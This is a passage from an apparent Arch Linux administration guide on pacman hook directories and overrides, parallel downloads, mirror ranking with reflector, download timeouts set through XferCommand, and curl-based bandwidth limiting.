/etc/pacman.d/hooks/restart-services.hook
```

### Directory Precedence and Overrides

#### Configuration in pacman.conf

The `HookDir` directive in `/etc/pacman.conf` specifies hook directories:

```
[options]
HookDir = /usr/share/libalpm/hooks/
HookDir = /etc/pacman.d/hooks/
```

Multiple `HookDir` lines can be specified, and they're processed in order.

#### Override Mechanism

**Later directories take precedence:** If a hook with the same filename exists in multiple directories, only the one from the last matching `HookDir` executes.

**Example scenario:**

**System hook:** `/usr/share/libalpm/hooks/update-cache.hook`
**User hook:** `/etc/pacman.d/hooks/update-cache.hook`

Result: Only the user hook executes, completely replacing the system version.

#### Selective Override

**Disable a system hook:** Create an empty file with the same name in the user hooks directory:

```
sudo touch /etc/pacman.d/hooks/unwanted-system-hook.hook
```

The empty user hook overrides the system hook, effectively disabling it.

**Modify a system hook:** Copy it to the user directory and modify:

```
sudo cp /usr/share/libalpm/hooks/system-hook.hook /etc/pacman.d/hooks/
sudo nano /etc/pacman.d/hooks/system-hook.hook
```

Your modified version takes precedence.

### Hybrid Approach: Extending System Hooks

#### Complement System Hooks

Rather than overriding, create additional user hooks that work alongside system hooks:

**System hook:** `fontconfig.hook` (updates font cache)
**User hook:** `custom-font-notify.hook` (notifies about font changes)

Both execute independently with different names.

#### Sequential Operation

Use numeric prefixes to ensure user hooks run before or after system hooks:

**System hook:** `update-desktop-database.hook` (no numeric prefix)
**User hook:** `10-desktop-pre-setup.hook` (runs first alphabetically)
**User hook:** `zz-desktop-post-cleanup.hook` (runs last alphabetically)

### Managing Hooks

#### Listing All Active Hooks

Find all hooks from both directories:

```
find /usr/share/libalpm/hooks/ /etc/pacman.d/hooks/ -name "*.hook" -type f 2>/dev/null | sort
```

#### Checking for Overrides

Identify hooks that exist in both directories (overrides):

```
comm -12 \
  <(ls /usr/share/libalpm/hooks/*.hook 2>/dev/null | xargs -n1 basename | sort) \
  <(ls /etc/pacman.d/hooks/*.hook 2>/dev/null | xargs -n1 basename | sort)
```

This lists filenames present in both directories, indicating user overrides of system hooks.

#### Comparing Hook Versions

View differences between system and user versions:

```
diff /usr/share/libalpm/hooks/hook-name.hook /etc/pacman.d/hooks/hook-name.hook
```

This shows what changes you've made in the user override.

### Backup and Restoration

#### Backup User Hooks

User hooks should be backed up as part of `/etc/`:

```
sudo tar -czf /backup/pacman-hooks-$(date +%Y%m%d).tar.gz /etc/pacman.d/hooks/
```

#### Restore User Hooks

Extract backed-up hooks:

```
sudo tar -xzf /backup/pacman-hooks-20251101.tar.gz -C /
```

#### System Hooks Restoration

System hooks are automatically restored when packages are reinstalled:

```
sudo pacman -S --overwrite /usr/share/libalpm/hooks/\* package-name
```

### Documentation and Maintenance

#### Document User Hooks

Add comments to user hooks explaining their purpose:

```
# /etc/pacman.d/hooks/custom-cleanup.hook
# Purpose: Automatically clean package cache and remove orphans
# Created: 2025-11-01
# Author: System Administrator
# Notes: Runs after every package operation

[Trigger]
Operation = Install
Operation = Upgrade
Operation = Remove
Type = Package
Target = *

[Action]
Description = Running custom cleanup...
When = PostTransaction
Exec = /usr/local/bin/cleanup-system.sh
```

#### Maintain a Hook Registry

Keep a log of custom hooks:

```
# /etc/pacman.d/hooks/README
# Custom Hooks Inventory
# Last updated: 2025-11-01

10-backup-kernel.hook     - Backup kernel before updates
20-clean-cache.hook       - Clean package cache after operations
30-remove-orphans.hook    - Remove orphaned packages
90-notify-updates.hook    - Send desktop notifications
```

### Troubleshooting

#### Identify Which Hook Executed

When multiple hooks exist, determine which one ran:

**Enable debug mode:**
```
sudo pacman -S package-name --debug 2>&1 | grep hook-name.hook
```

This shows the full path of the executed hook.

#### Temporarily Disable User Hook

Rename to disable without deleting:

```
sudo mv /etc/pacman.d/hooks/hook.hook /etc/pacman.d/hooks/hook.hook.disabled
```

Re-enable:
```
sudo mv /etc/pacman.d/hooks/hook.hook.disabled /etc/pacman.d/hooks/hook.hook
```

#### Temporarily Disable System Hook

Override with empty user hook:

```
sudo touch /etc/pacman.d/hooks/system-hook-name.hook
```

Remove the override to re-enable:
```
sudo rm /etc/pacman.d/hooks/system-hook-name.hook
```

### Best Practices

**Prefer user hooks for customization:** Create new user hooks rather than modifying system hooks when possible.

**Document overrides:** If you override a system hook, document why and what you changed.

**Use descriptive names:** User hooks should have clear, descriptive names indicating their purpose.

**Version control:** Keep user hooks in version control (git) for tracking changes.

**Test before deploying:** Test user hooks on non-production systems before deploying to critical machines.

**Monitor system hooks:** Be aware of system hooks installed by packages; they may affect behavior.

**Minimize overrides:** Only override system hooks when absolutely necessary; complementary hooks are preferred.

**Backup user hooks:** Include `/etc/pacman.d/hooks/` in regular system backups.

**Clean up unused hooks:** Remove obsolete user hooks to reduce clutter and confusion.

**Check after package updates:** Verify user hook overrides still work correctly after package updates.

### Security Considerations

**Review system hooks:** Understand what system hooks do, especially from third-party repositories.

**Protect user hooks:** Ensure `/etc/pacman.d/hooks/` has appropriate permissions (root-owned, 755).

**Validate hook scripts:** Review external scripts called by hooks for security issues.

**Avoid sensitive ** Don't include passwords or secrets in hook files.

**Limit scope:** Hooks run as root; minimize privileges and operations.

Understanding the distinction between system and user hooks enables effective customization while maintaining system integrity and ensuring hooks survive package updates appropriately.

# Download Management

## Parallel Downloads

### Overview

Parallel downloads allow pacman to download multiple packages simultaneously rather than sequentially, significantly reducing the time required for system updates and package installations. This feature was introduced in pacman 6.0.

### Enabling Parallel Downloads

#### Configuration in pacman.conf

Edit `/etc/pacman.conf` to enable parallel downloads:

```
sudo nano /etc/pacman.conf
```

Add or uncomment the `ParallelDownloads` directive in the `[options]` section:

```
[options]
ParallelDownloads = 5
```

The number specifies how many packages to download simultaneously.

#### Recommended Values

**Conservative (default):**
```
ParallelDownloads = 5
```

Provides good speedup without overwhelming the connection.

**Moderate:**
```
ParallelDownloads = 10
```

Better for fast internet connections (50+ Mbps).

**Aggressive:**
```
ParallelDownloads = 15
```

For very fast connections (100+ Mbps) or when downloading small packages.

**Maximum:**
```
ParallelDownloads = 20
```

Generally not recommended; diminishing returns and potential mirror strain.

### How It Works

#### Sequential vs Parallel Downloading

**Without parallel downloads (traditional):**
1. Download package 1 → Complete
2. Download package 2 → Complete
3. Download package 3 → Complete
4. Total time: Sum of all individual download times

**With parallel downloads (ParallelDownloads = 5):**
1. Download packages 1, 2, 3, 4, 5 simultaneously
2. As each completes, start the next package
3. All packages finish faster overall
4. Total time: Reduced significantly, limited by bandwidth

#### Benefits

**Faster updates:** System upgrades complete more quickly, especially when many packages need updating.

**Better bandwidth utilization:** Maximizes use of available internet bandwidth rather than downloading one small package at a time.

**Reduced wait time:** Less time spent waiting for package operations to complete.

**Improved user experience:** More responsive package management, particularly on fast connections.

### Performance Considerations

#### Optimal Number Selection

The ideal `ParallelDownloads` value depends on:

**Internet connection speed:**
- Slow (< 10 Mbps): 3-5 parallel downloads
- Medium (10-50 Mbps): 5-10 parallel downloads
- Fast (50-100 Mbps): 10-15 parallel downloads
- Very fast (> 100 Mbps): 15-20 parallel downloads

**Mirror capacity:**
- Some mirrors may throttle or struggle with many simultaneous connections
- More isn't always better if mirrors can't handle the load

**Package size distribution:**
- Many small packages benefit more from parallel downloads
- Few large packages see less benefit

**System resources:**
- Each concurrent download uses some CPU and RAM for verification
- Very resource-constrained systems might want lower values

### Testing and Optimization

#### Benchmark Different Settings

Test various `ParallelDownloads` values to find optimal performance:

**Test with 5 parallel downloads:**
```
# Set ParallelDownloads = 5
time sudo pacman -Syu
```

**Test with 10 parallel downloads:**
```
# Set ParallelDownloads = 10
time sudo pacman -Syu
```

Compare times to determine the sweet spot for your connection and mirrors.

#### Monitor Download Performance

Watch download activity during package operations:

```
sudo pacman -Syu
```

Observe:
- How many packages download simultaneously
- Whether bandwidth is fully utilized
- If downloads seem to queue or stall

### Compatibility

#### Pacman Version Requirement

Parallel downloads require **pacman 6.0 or later**.

**Check pacman version:**
```
pacman --version
```

**Example output:**
```
Pacman v6.0.2 - libalpm v13.0.2
```

If you're on pacman 5.x or earlier, the `ParallelDownloads` directive is ignored.

#### Upgrading Pacman

To use parallel downloads on older systems:

```
sudo pacman -Syu pacman
```

After upgrading pacman to 6.0+, enable `ParallelDownloads` in the configuration.

### Interaction with Other Features

#### Mirror Selection

Parallel downloads work best with:

**Multiple fast mirrors:** Having several mirrors in the mirrorlist allows pacman to distribute load and use the fastest available servers.

**Geographically close mirrors:** Reduces latency, improving parallel download efficiency.

**HTTPS mirrors:** While slightly slower than HTTP, HTTPS provides security without significantly impacting parallel download performance.

#### Signature Verification

Package signature verification happens **after** download completes. With parallel downloads:

1. Multiple packages download simultaneously
2. Each completed package is verified before installation
3. Verification is still single-threaded (as of pacman 6.0)

Future pacman versions may parallelize signature verification as well.

### Troubleshooting

#### Slow Downloads Despite Parallel Downloads

**Possible causes:**

**Mirror limitations:** Some mirrors throttle connections or have bandwidth limits.

**Solution:** Update mirrorlist to use faster mirrors:
```
sudo reflector --latest 20 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

**Connection bottleneck:** Your internet connection is the limiting factor, not download parallelism.

**Solution:** Reduce `ParallelDownloads` to avoid overhead; more connections won't help if bandwidth is saturated.

**ISP throttling:** Internet service provider may throttle multiple connections.

**Solution:** Try different mirrors or HTTPS vs HTTP protocols.

#### Download Failures or Timeouts

Too many parallel downloads can cause issues:

**Symptoms:**
- Connection timeouts
- Failed downloads
- Mirror refusing connections

**Solution:** Reduce `ParallelDownloads` value:
```
ParallelDownloads = 3
```

#### Increased CPU/Memory Usage

Each parallel download consumes resources:

**Symptoms:**
- High CPU usage during downloads
- Increased memory consumption
- System slowdown during package operations

**Solution:** Lower `ParallelDownloads` on resource-constrained systems:
```
ParallelDownloads = 3
```

### Comparison: Before and After

#### Example Scenario

**100 packages to download, average 10 MB each, 50 Mbps connection**

**Sequential (ParallelDownloads disabled):**
- Download time: ~27 minutes (one at a time)

**Parallel (ParallelDownloads = 5):**
- Download time: ~8-10 minutes (5 at a time)
- Speedup: ~60-70% reduction

**Parallel (ParallelDownloads = 10):**
- Download time: ~6-8 minutes (10 at a time)
- Speedup: ~70-80% reduction

Actual performance varies based on connection speed, mirror performance, and package sizes.

### Advanced Configuration

#### Disable Parallel Downloads

To disable parallel downloads and return to sequential behavior:

**Remove or comment out the directive:**
```
#ParallelDownloads = 5
```

Or set to 1:
```
ParallelDownloads = 1
```

#### Temporary Override

Override parallel downloads for a single operation:

Unfortunately, pacman doesn't provide a command-line flag to override `ParallelDownloads`. You must edit `/etc/pacman.conf` to change the setting.

### Best Practices

**Start conservative:** Begin with `ParallelDownloads = 5` and adjust based on performance.

**Monitor performance:** Observe actual download speeds and adjust accordingly.

**Consider connection type:** WiFi connections may benefit from lower values than wired connections.

**Respect mirrors:** Don't use excessively high values that stress mirror servers unnecessarily.

**Update mirrors regularly:** Fast, reliable mirrors maximize parallel download benefits.

**Test during off-peak:** Mirror performance varies by time of day; test at typical usage times.

**Balance speed and stability:** Higher values aren't always better if they cause timeouts or failures.

**Resource constraints matter:** Lower-powered systems (Raspberry Pi, VMs) should use lower values.

### Security Considerations

**Signature verification unchanged:** Parallel downloads don't affect signature verification; all packages are still validated.

**HTTPS recommended:** Use HTTPS mirrors with parallel downloads for security without significant performance penalty.

**Mirror trust:** Parallel downloads don't change mirror trust model; package signatures provide security, not download method.

### Future Developments

Potential future improvements to parallel downloads:

**Parallel signature verification:** Verifying signatures in parallel could further reduce installation time.

**Intelligent scheduling:** Optimizing which packages download first based on size and dependencies.

**Adaptive parallelism:** Automatically adjusting parallel download count based on connection performance.

**Per-mirror parallelism:** Different parallel settings for different mirrors based on their capacity.

Parallel downloads are a significant improvement in pacman's performance, making system maintenance faster and more efficient for most users with modern internet connections.

## Mirror Ranking and Selection

### Understanding Mirrors

Mirrors are servers that host copies of Arch Linux package repositories. Selecting fast, reliable mirrors is crucial for optimal package download speeds and system maintenance efficiency. Mirrors differ in geographic location, bandwidth, synchronization frequency, and reliability.

### Mirror Configuration File

#### Mirrorlist Location

The default mirrorlist file is located at:

```
/etc/pacman.d/mirrorlist
```

This file contains a list of available mirror servers that pacman uses to download packages.

#### Mirrorlist Format

```
## Country: United States
Server = https://mirrors.example.com/archlinux/$repo/os/$arch

## Country: Germany
#Server = https://mirror.de/archlinux/$repo/os/$arch
```

**Active mirrors:** Uncommented `Server` lines
**Disabled mirrors:** Lines starting with `#Server`
**Comments:** Lines starting with `##`

Pacman tries mirrors in order from top to bottom, using the first successful connection.

### Manual Mirror Ranking

#### Backup Current Mirrorlist

Before making changes, backup the existing configuration:

```
sudo cp /etc/pacman.d/mirrorlist /etc/pacman.d/mirrorlist.backup
```

#### Selecting Mirrors Manually

Edit the mirrorlist:

```
sudo nano /etc/pacman.d/mirrorlist
```

**Move fast mirrors to the top:**

```
## Fastest mirrors
Server = https://fast-mirror1.com/archlinux/$repo/os/$arch
Server = https://fast-mirror2.com/archlinux/$repo/os/$arch

## Backup mirrors
#Server = https://slower-mirror.com/archlinux/$repo/os/$arch
```

**Geographic considerations:**
- Prioritize mirrors in your country or region
- Closer mirrors generally have lower latency
- Time zone proximity may affect peak load times

#### Testing Mirrors Manually

Test mirror download speed using curl:

```
time curl -o /dev/null https://mirror.example.com/archlinux/core/os/x86_64/core.db
```

Compare times across multiple mirrors to identify the fastest.

**Check mirror sync status:**
```
curl -s https://mirror.example.com/archlinux/lastupdate
```

Compare the timestamp with other mirrors to ensure up-to-date synchronization.

### Automated Mirror Ranking with Reflector

#### Installing Reflector

Reflector is the recommended tool for automated mirror ranking on Arch Linux:

```
sudo pacman -S reflector
```

#### Basic Reflector Usage

**Update mirrorlist with 20 fastest mirrors:**

```
sudo reflector --latest 20 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

This fetches the 20 most recently synchronized mirrors, filters by HTTPS protocol, sorts by download rate, and saves to the mirrorlist.

#### Reflector Options

**--latest N:** Select N most recently synchronized mirrors

```
sudo reflector --latest 10
```

Ensures mirrors are up-to-date (recently synced with master servers).

**--protocol https|http|rsync:** Filter by protocol

```
sudo reflector --protocol https          # HTTPS only
sudo reflector --protocol https,http     # Both HTTPS and HTTP
```

HTTPS provides encrypted downloads and is recommended.

**--sort {age,rate,country,score,delay}:** Sort criteria

```
sudo reflector --sort rate      # By download speed
sudo reflector --sort age       # By sync time (newest first)
sudo reflector --sort delay     # By mirror delay
```

Rate-based sorting provides fastest downloads.

**--country 'Country1,Country2':** Filter by country

```
sudo reflector --country 'United States'
sudo reflector --country 'United States,Canada'
sudo reflector --country Germany
```

Limits mirrors to specific countries for geographic proximity.

**--fastest N:** Select N fastest mirrors (tests actual speed)

```
sudo reflector --latest 50 --fastest 10
```

Tests actual download speeds from 50 recent mirrors and selects the 10 fastest.

**--age N:** Limit to mirrors synced within the last N hours

```
sudo reflector --age 12      # Synced within last 12 hours
sudo reflector --age 24      # Synced within last 24 hours
```

**--save /path/to/file:** Save output to file

```
sudo reflector --latest 20 --sort rate --save /etc/pacman.d/mirrorlist
```

Directly updates the mirrorlist file.

**--threads N:** Number of threads for speed testing

```
sudo reflector --threads 10
```

Increases parallelism during mirror speed tests.

**--verbose:** Show detailed output

```
sudo reflector --verbose --latest 20
```

Displays mirror information and rating process.

#### Practical Reflector Examples

**Fast, nearby mirrors (US):**
```
sudo reflector --country 'United States' --latest 10 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

**Globally optimized mirrors:**
```
sudo reflector --latest 50 --protocol https --sort rate --fastest 10 --save /etc/pacman.d/mirrorlist
```

**Fresh, high-quality mirrors:**
```
sudo reflector --age 6 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

**Comprehensive selection:**
```
sudo reflector --latest 200 --protocol https --fastest 20 --sort rate --threads 20 --save /etc/pacman.d/mirrorlist
```

### Automated Reflector Updates

#### Systemd Timer (Recommended)

Enable automatic weekly mirrorlist updates:

**Create reflector configuration:**

```
sudo nano /etc/xdg/reflector/reflector.conf
```

**Example configuration:**
```
# Reflector configuration file for systemd service

--save /etc/pacman.d/mirrorlist
--protocol https
--country 'United States'
--latest 20
--sort rate
--age 12
```

**Enable the systemd timer:**

```
sudo systemctl enable reflector.timer
sudo systemctl start reflector.timer
```

**Check timer status:**
```
systemctl status reflector.timer
```

**Manual trigger:**
```
sudo systemctl start reflector.service
```

This runs reflector immediately using the configured settings.

#### Cron Job Alternative

Schedule reflector with cron:

```
sudo crontab -e
```

**Weekly update (Sundays at 3 AM):**
```
0 3 * * 0 /usr/bin/reflector --latest 20 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

**Monthly update (first day at 2 AM):**
```
0 2 1 * * /usr/bin/reflector --country 'United States' --latest 10 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

#### Pacman Hook for Automatic Updates

Create a hook to update mirrors when the mirrorlist package updates:

```
sudo nano /etc/pacman.d/hooks/mirrorlist-update.hook
```

**Hook content:**
```
[Trigger]
Operation = Upgrade
Type = Package
Target = pacman-mirrorlist

[Action]
Description = Updating mirror list with reflector...
When = PostTransaction
Depends = reflector
Exec = /usr/bin/reflector --latest 20 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

This automatically optimizes mirrors when the official mirrorlist package updates.

### Using Pacman-Mirrors (Manjaro)

Manjaro uses its own mirror management tool:

#### Basic Pacman-Mirrors Commands

**Fast-track to best mirrors:**
```
sudo pacman-mirrors --fasttrack
```

Automatically selects the fastest mirrors.

**Select by country:**
```
sudo pacman-mirrors --country United_States
sudo pacman-mirrors --country Germany,France
```

**Interactive mode:**
```
sudo pacman-mirrors --interactive
```

Opens a GUI for manual mirror selection.

**Generate ranked mirrorlist:**
```
sudo pacman-mirrors --api --set-branch stable --protocol https
```

**Update database after changing mirrors:**
```
sudo pacman -Syy
```

### Mirror Quality Indicators

#### Synchronization Status

**Check mirror freshness:**
```
curl -s https://mirror.example.com/archlinux/lastupdate
```

Compare the timestamp with the official Arch Linux repository. Mirrors should sync at least daily.

**Arch Linux mirror status page:**
```
https://archlinux.org/mirrors/status/
```

Shows detailed mirror information including:
- Last sync time
- Sync frequency
- Completion percentage
- Average delay

#### Mirror Speed Testing

**Simple download test:**
```
time curl -o /dev/null https://mirror.example.com/archlinux/core/os/x86_64/core.db
```

**Comprehensive test with multiple files:**
```bash
#!/bin/bash
MIRROR="https://mirror.example.com/archlinux"
for repo in core extra; do
  echo "Testing $repo..."
  time curl -o /dev/null "$MIRROR/$repo/os/x86_64/$repo.db"
done
```

#### Mirror Reliability

**Connection stability:** Mirrors that frequently timeout or have connection issues should be avoided.

**Uptime:** Check mirror status page for historical uptime information.

**Bandwidth:** High-bandwidth mirrors handle multiple connections better.

**HTTPS availability:** HTTPS support indicates a well-maintained mirror.

### Troubleshooting Mirror Issues

#### Slow Downloads

**Symptoms:**
- Package downloads are slow
- Updates take excessive time

**Solutions:**

**Regenerate mirrorlist with reflector:**
```
sudo reflector --latest 20 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

**Try different geographic regions:**
```
sudo reflector --country 'Canada,United_States' --latest 10 --sort rate --save /etc/pacman.d/mirrorlist
```

**Test individual mirrors manually** and disable slow ones in the mirrorlist.

#### Mirror Out of Sync

**Symptoms:**
- Packages not found errors
- Version mismatches
- Database errors

**Solutions:**

**Force database refresh:**
```
sudo pacman -Syy
```

**Select only recently synced mirrors:**
```
sudo reflector --age 6 --latest 20 --sort rate --save /etc/pacman.d/mirrorlist
```

**Check mirror status:**
Visit https://archlinux.org/mirrors/status/ and avoid mirrors with high delay or low completion percentage.

#### Connection Failures

**Symptoms:**
- "Failed to retrieve" errors
- Timeout messages
- Connection refused

**Solutions:**

**Use multiple mirrors:** Keep several mirrors active in the mirrorlist for redundancy:
```
sudo reflector --latest 20 --save /etc/pacman.d/mirrorlist
```

**Switch protocols (HTTPS vs HTTP):**
```
sudo reflector --protocol http --latest 20 --save /etc/pacman.d/mirrorlist
```

**Try different countries:**
```
sudo reflector --country 'Germany,France,Netherlands' --latest 10 --save /etc/pacman.d/mirrorlist
```

### Best Practices

**Regular updates:** Update mirrorlist monthly or when experiencing slow downloads.

**Multiple mirrors:** Keep 10-20 mirrors active for redundancy and load distribution.

**Geographic diversity:** Include mirrors from multiple regions to handle regional outages.

**Protocol preference:** Use HTTPS for security and often better performance.

**Monitor performance:** Periodically check download speeds and adjust as needed.

**Automation:** Use reflector timer for hands-off mirror maintenance.

**Recent sync required:** Prioritize mirrors synced within the last 12-24 hours.

**Backup mirrorlist:** Always backup before making manual changes.

**Test after changes:** Run `pacman -Sy` to verify mirrors work correctly.

**Consider connection type:** WiFi may perform differently than wired; test accordingly.

Proper mirror ranking and selection dramatically improves package management performance, making system updates faster and more reliable.

## Download Timeout Configuration

### Overview

Pacman's download timeout settings control how long the package manager waits for network operations before considering a download failed. Proper timeout configuration ensures reliable package downloads while avoiding unnecessary delays from unresponsive mirrors.

### Timeout Configuration Location

Timeout settings are not directly configurable in `/etc/pacman.conf`. Instead, pacman relies on the underlying download library (libalpm) and curl for timeout behavior. However, there are several ways to influence and control timeout behavior.

### Default Timeout Behavior

#### Built-in Timeouts

Pacman uses curl internally for downloads, which has default timeout values:

**Connection timeout:** Time to establish connection (default: ~300 seconds)
**Low speed limit:** Minimum acceptable speed (default: 1000 bytes/sec)
**Low speed time:** Duration below minimum speed before aborting (default: 10 seconds)

If download speed drops below 1000 bytes/sec for 10 seconds, the download fails and moves to the next mirror.

### Command-Line Timeout Control

#### Disable Download Timeout

For problematic connections or slow mirrors, disable timeout checking:

```
sudo pacman -Syu --disable-download-timeout
```

This removes download timeout restrictions, allowing very slow downloads to complete. Useful for:
- Very slow internet connections
- High-latency connections (satellite, international)
- Unreliable connections with frequent interruptions
- Large packages on limited bandwidth

**Warning:** This may cause pacman to hang indefinitely on completely stalled downloads.

#### Temporary Override

Use for one-time operations:

```
sudo pacman -S package-name --disable-download-timeout
```

### XferCommand Configuration

#### Custom Download Manager

The `XferCommand` option in `/etc/pacman.conf` allows using external download managers with custom timeout settings:

```
sudo nano /etc/pacman.conf
```

Add or modify in the `[options]` section:

**Using curl with custom timeouts:**
```
[options]
XferCommand = /usr/bin/curl --connect-timeout 60 --max-time 0 -C - -f -o %o %u
```

**Options explained:**
- `--connect-timeout 60` - Maximum 60 seconds to establish connection
- `--max-time 0` - No maximum time limit for total download (0 = unlimited)
- `-C -` - Continue partial downloads
- `-f` - Fail silently on server errors
- `-o %o` - Output to file (%o is pacman's output path variable)
- `%u` - URL to download (%u is pacman's URL variable)

**More conservative timeouts:**
```
XferCommand = /usr/bin/curl --connect-timeout 30 --speed-limit 1000 --speed-time 30 -C - -f -o %o %u
```

**Options:**
- `--connect-timeout 30` - 30 seconds to connect
- `--speed-limit 1000` - Minimum 1000 bytes/sec
- `--speed-time 30` - Fail if below speed limit for 30 seconds

**Using wget:**
```
XferCommand = /usr/bin/wget --timeout=60 --passive-ftp -c -O %o %u
```

**Options:**
- `--timeout=60` - 60-second timeout for all operations
- `--passive-ftp` - Use passive FTP mode
- `-c` - Continue partial downloads
- `-O %o` - Output file

**Using aria2c (parallel downloader):**
```
XferCommand = /usr/bin/aria2c --allow-overwrite=true --continue=true --file-allocation=none --log-level=error --max-tries=2 --max-connection-per-server=2 --max-file-not-found=5 --min-split-size=5M --no-conf --remote-time=true --summary-interval=60 --timeout=60 --dir=/ --out=%o %u
```

This provides advanced download features including better timeout handling.

### Environment Variables

#### Curl Configuration File

Create a custom curl configuration for pacman:

```
sudo nano /etc/pacman.d/curl.conf
```

**Example configuration:**
```
connect-timeout = 60
max-time = 0
speed-limit = 1000
speed-time = 30
retry = 3
retry-delay = 5
```

**Use in XferCommand:**
```
XferCommand = /usr/bin/curl -K /etc/pacman.d/curl.conf -C - -f -o %o %u
```

The `-K` flag loads the configuration file.

### Network-Specific Timeout Strategies

#### Fast, Reliable Connection

For fast, stable connections, use aggressive timeouts to quickly skip bad mirrors:

```
XferCommand = /usr/bin/curl --connect-timeout 10 --speed-limit 5000 --speed-time 10 -C - -f -o %o %u
```

**Benefits:**
- Quickly fails on unresponsive mirrors
- Moves to next mirror rapidly
- Higher speed requirements ensure quality downloads

#### Slow or Unreliable Connection

For slow or unstable connections, use lenient timeouts:

```
XferCommand = /usr/bin/curl --connect-timeout 120 --speed-limit 500 --speed-time 60 -C - -f -o %o %u
```

Or disable timeouts entirely:
```
sudo pacman -Syu --disable-download-timeout
```

**Benefits:**
- Tolerates slower speeds
- Waits longer for mirror response
- Completes downloads on marginal connections

#### Satellite or High-Latency Connection

For high-latency connections (satellite, international):

```
XferCommand = /usr/bin/curl --connect-timeout 300 --speed-limit 100 --speed-time 120 -C - -f -o %o %u
```

**Characteristics:**
- Very long connection timeout (300 seconds)
- Very low minimum speed (100 bytes/sec)
- Extended grace period (120 seconds)

### Retry Configuration

#### Curl Retry Options

Configure automatic retries for failed downloads:

```
XferCommand = /usr/bin/curl --retry 5 --retry-delay 3 --retry-max-time 120 --connect-timeout 60 -C - -f -o %o %u
```

**Options:**
- `--retry 5` - Retry up to 5 times on transient errors
- `--retry-delay 3` - Wait 3 seconds between retries
- `--retry-max-time 120` - Maximum 120 seconds total retry time
- `--connect-timeout 60` - 60 seconds per connection attempt

#### Mirror Fallback

Pacman automatically tries the next mirror when a download fails. Ensure multiple mirrors are configured in `/etc/pacman.d/mirrorlist` for effective fallback:

```
Server = https://mirror1.example.com/archlinux/$repo/os/$arch
Server = https://mirror2.example.com/archlinux/$repo/os/$arch
Server = https://mirror3.example.com/archlinux/$repo/os/$arch
```

### Troubleshooting Timeout Issues

#### Frequent Timeout Errors

**Symptoms:**
```
error: failed retrieving file 'package.pkg.tar.zst' from mirror.example.com : Operation timed out after 10000 milliseconds
```

**Solutions:**

**1. Disable timeout temporarily:**
```
sudo pacman -Syu --disable-download-timeout
```

**2. Update mirrorlist to faster mirrors:**
```
sudo reflector --latest 20 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

**3. Increase timeout values in XferCommand:**
```
XferCommand = /usr/bin/curl --connect-timeout 120 -C - -f -o %o %u
```

**4. Check internet connection:**
```
ping -c 4 archlinux.org
```

#### Stalled Downloads

**Symptoms:**
- Downloads start but never complete
- Progress bar stops moving
- No error messages

**Solutions:**

**1. Use speed-based timeout:**
```
XferCommand = /usr/bin/curl --speed-limit 1000 --speed-time 30 -C - -f -o %o %u
```

**2. Enable retry with timeout:**
```
XferCommand = /usr/bin/curl --retry 3 --retry-delay 5 --max-time 600 -C - -f -o %o %u
```

**3. Switch to different mirrors:**
```
sudo reflector --country 'YourCountry' --latest 10 --save /etc/pacman.d/mirrorlist
```

#### Connection Refused or Immediate Failures

**Symptoms:**
- Instant failures without attempting download
- "Connection refused" errors

**Solutions:**

**1. Check mirror availability:**
```
curl -I https://mirror.example.com/archlinux/core/os/x86_64/core.db
```

**2. Switch protocols (HTTPS vs HTTP):**
```
sudo reflector --protocol http --latest 20 --save /etc/pacman.d/mirrorlist
```

**3. Verify firewall settings:**
```
sudo iptables -L
```

Ensure outbound HTTPS/HTTP traffic is allowed.

### Best Practices

**Match timeouts to connection:** Configure timeouts appropriate for your internet speed and reliability.

**Use multiple mirrors:** Keep 10-20 mirrors active for automatic fallback.

**Enable retries:** Configure automatic retries to handle transient network issues.

**Speed-based timeouts:** Prefer `--speed-limit` over `--max-time` to catch stalled downloads.

**Conservative connection timeout:** Use reasonable connection timeouts (30-60 seconds) to detect dead mirrors.

**Test configuration changes:** Verify timeout settings work with test downloads.

**Document custom settings:** Comment your XferCommand configuration explaining choices.

**Monitor download performance:** Adjust timeouts based on actual download behavior.

**Balance patience and responsiveness:** Too short = premature failures; too long = wasted time on bad mirrors.

**Keep fallback options:** Don't disable all timeouts; always have a maximum limit.

### Example Configurations for Common Scenarios

#### Home Broadband (50+ Mbps)

```
XferCommand = /usr/bin/curl --connect-timeout 30 --speed-limit 5000 --speed-time 15 --retry 3 -C - -f -o %o %u
```

#### Mobile/Cellular Connection

```
XferCommand = /usr/bin/curl --connect-timeout 60 --speed-limit 1000 --speed-time 30 --retry 5 --retry-delay 10 -C - -f -o %o %u
```

#### University/Corporate Network

```
XferCommand = /usr/bin/curl --connect-timeout 20 --speed-limit 10000 --speed-time 10 --retry 2 -C - -f -o %o %u
```

#### Satellite/High-Latency

```
XferCommand = /usr/bin/curl --connect-timeout 300 --speed-limit 500 --speed-time 60 --retry 10 -C - -f -o %o %u
```

#### Unreliable/Flaky Connection

```
XferCommand = /usr/bin/curl --connect-timeout 120 --speed-limit 500 --speed-time 45 --retry 10 --retry-delay 15 --retry-max-time 300 -C - -f -o %o %u
```

Proper timeout configuration ensures reliable package downloads while minimizing time wasted on unresponsive mirrors or stalled connections.

## Bandwidth Management

### Overview

Bandwidth management in pacman allows you to control download speeds, prioritize network usage, and prevent package operations from consuming all available bandwidth. This is particularly useful on shared networks, metered connections, or when running background updates.

### XferCommand for Bandwidth Control

Since pacman doesn't have built-in bandwidth limiting, you must use external download managers through the `XferCommand` directive in `/etc/pacman.conf`.

### Using Curl with Rate Limiting

#### Basic Rate Limiting

Edit `/etc/pacman.conf`:

```
sudo nano /etc/pacman.conf
```

Add to the `[options]` section:

```
[options]
XferCommand = /usr/bin/curl --limit-rate 500K -C - -f -o %o %u
```

**`--limit-rate 500K`:** Limits download speed to 500 KB/sec

**Common rate specifications:**
- `100K` - 100 kilobytes per second
- `1M` - 1 megabyte per second
- `2M` - 2 megabytes per second
- `10M` - 10 megabytes per second

**Note:** Use capital K/M for kilobytes/megabytes; lowercase k/m for kilobits/megabits.

#### Dynamic Rate Limiting

**Percentage-based limiting (requires calculation):**

For a 10 Mbps connection, limit to 50% (5 Mbps = ~625 KB/sec):
```
XferCommand = /usr/bin/curl --limit-rate 625K -C - -f -o %o %u
```

